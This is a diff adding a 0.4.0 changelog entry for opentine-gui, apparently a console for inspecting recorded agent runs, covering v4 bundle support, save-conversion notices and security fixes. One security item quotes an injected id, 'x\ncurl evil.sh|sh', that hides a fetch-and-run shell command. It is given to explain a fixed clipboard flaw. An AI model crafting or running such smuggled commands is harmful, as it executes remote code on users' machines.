@@ -2,6 +2,56 @@
 
 All notable changes to opentine-gui are documented here.
 
+## [0.4.0] - 2026-11-04
+
+Targets **opentine 0.34.0**, twenty-six releases on from 0.8.0. The release that matters is
+0.26: every opentine writer now produces a TINEZ1-compressed `tine-artifact/4` bundle signed at
+`tine-sig/3`. On the old floor the console could not open those files at all; on 0.34 with the
+old code it read them, but its own trust and save-safety checks parsed the raw bytes as JSON and
+silently fell back to "unknown".
+
+**Requires `opentine >= 0.34.0`** (`< 0.35`).
+
+### Added
+
+- **Format v4 is understood.** The trust panel reads the `tine-sig/3` scheme off a v4 bundle and
+  states what it covers (the root and the annotation head: steps, tags and metadata). The
+  integrity caveat for v4 says what is actually true there: every object id is re-derived, tags
+  and metadata included, and it is still unkeyed. The run inspector reports `Format: v4`
+  (opentine's reader rebuilds a v2-shaped record, so `run.format_version` says 2) and an
+  upgraded run's `upgraded_from` record as a claim.
+- **Saves say when they convert a file.** Pause, resume and fork re-save through opentine, which
+  writes v4. When the file on disk is v1/v2, the confirmation now says the save converts it and
+  that opentine before 0.26 cannot open the result.
+- **Save-safety for v4.** "Would this save drop something?" is answered for v4 bundles by
+  round-tripping them through the installed reader and writer and comparing roots, instead of
+  diffing keys of a run dict a v4 file does not have.
+- **Newer recorder metadata is shown, labelled as claims:** capture method and source format
+  (with a warning when the agent could have edited the log it was imported from), the claimed
+  agent identity, edited forks (opentine 0.28/0.33) with the changed paths and a note that the
+  edited step never ran, rewind originals (0.32), and recorder warnings.
+- **RFC 3161 timestamp sidecars** (`RUN.tine.timestamps.json`, 0.31) are reported beside the run,
+  explicitly as not verified here.
+- **`provider:` and `harness:` filters**, matching the predicates opentine's query grammar gained,
+  evaluated by the same rules as `tine ls`.
+- Demo runs are regenerated as v4, plus `demo-legacy-v2` and `demo-edited-fork`;
+  `scripts/verify_fixtures.py` reports the on-disk format and requires both v2 and v4 fixtures.
+
+### Security
+
+- **Copy id refuses an id with control characters.** Ids are artifact-controlled and opentine
+  accepts any string; one like `x\ncurl evil.sh|sh` was shown flattened but copied raw, and ran
+  its second line when pasted into a shell.
+- Terminal escapes and other C0 controls are now stripped from every text widget, so "Copy
+  text" / "Copy panel" cannot carry them to the clipboard.
+- Exception text in the pricing and statistics panels is flattened, so it cannot open a row.
+- Size and age formatting tolerate NaN, infinite and out-of-range values.
+
+### Changed
+
+- Imported traces no longer carry a cost (opentine 0.10+ never trusts a file's own figure);
+  price them with `Run > Price this run...`.
+
 ## [0.3.0] - 2026-08-24
 
 Targets **opentine 0.8.0**, four releases on from the 0.4.0/0.5.0 this console was written
